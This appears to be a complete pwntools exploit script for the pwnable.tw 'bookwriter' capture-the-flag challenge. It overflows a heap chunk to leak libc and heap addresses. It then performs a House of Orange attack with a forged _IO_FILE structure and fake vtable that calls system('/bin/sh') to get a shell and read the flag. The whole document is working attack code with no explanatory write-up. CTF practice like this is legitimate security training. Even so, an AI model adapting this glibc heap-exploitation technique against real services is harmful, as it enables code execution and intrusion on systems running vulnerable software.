#!/usr/bin/env python3
from pwn import *

PORT = 10304
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./bookwriter_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x00000000004009FE
            b* 0x0000000000400B1F
            b* 0x0000000000400BAD
            b* 0x0000000000400C31
            b* malloc+79
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
    sla(b'Your choice :', str(opt).encode())

def add(sz, dt):
    menu(1)
    sla(b'Size of page :', str(sz).encode())
    sa(b'Content :', dt)

def view(idx):
    menu(2)
    sla(b'Index of page :', str(idx).encode())

def edit(idx, dt):
    menu(3)
    sla(b'Index of page :', str(idx).encode())
    sa(b'Content:', dt)

def info(opt, dt = b''):
    menu(4)
    sla(b'(yes:1 / no:0) ', str(opt).encode())
    if (opt == 1):
        sa(b'Author :', dt)

sa(b'Author :', b'A'*0x40)

# Stage 1: Leak heap, libc

add(0x18, b'A' * 8)

edit(0, b'B'*0x18)
edit(0, b'C'*0x18 + p64(0xfe1)[:3])
add(0x1000, b'D' * 8)
add(0x8, b'A'*8)
view(2)
p.recvuntil(b'A'*8)
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3c4188
log.info(f'libc_base: {hex(libc.address)}')

menu(4)
p.recvuntil(b'A'*0x40)
heap_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x10
log.info(f'heap_base: {hex(heap_base)}')
sla(b'? (yes:1 / no:0) ', b'0')

# Stage 2: House of Orange + FSOP

for i in range(5):
    add(0x60, b'F'*8)

edit(0, b'\x00')

add(0x30, b'X')  # size[0] = malloc(0x30)

chunk0 = heap_base + 0x10
ub_chunk = heap_base + 0x2b0

system_addr  = libc.sym.system
io_list_all  = libc.sym._IO_list_all
unsorted_bin = libc.address + 0x3c3b78  # main arena + 88

fake_file = flat(
    {
        0x00: b'/bin/sh\x00',
        0x08: p64(0x61),
        # unsorted bin attack metadata
        0x10: p64(unsorted_bin),          # fd
        0x18: p64(io_list_all - 0x10),    # bk
        # FILE fields
        0x20: p64(0),                     # _IO_write_base
        0x28: p64(1),                     # _IO_write_ptr > _IO_write_base
        0xc0: p64(0),                     # _mode <= 0
        # vtable pointer
        0xd8: p64(ub_chunk + 0x60),
        # fake vtable
        0x60 + 0x18: p64(system_addr),    # __overflow = system
    },
    filler=b'\x00',
    length=0xe0
)

pl = flat(
    b'\x00',
    b'A'*(ub_chunk-chunk0-1),
    fake_file
    )

edit(0, pl)
# GDB()
menu(1)
sla(b'Size of page :', b'16')

p.sendline(b'cat home/bookwriter/flag')
p.interactive()

# Run the script a few times to get the flag :))

# d1nhdwc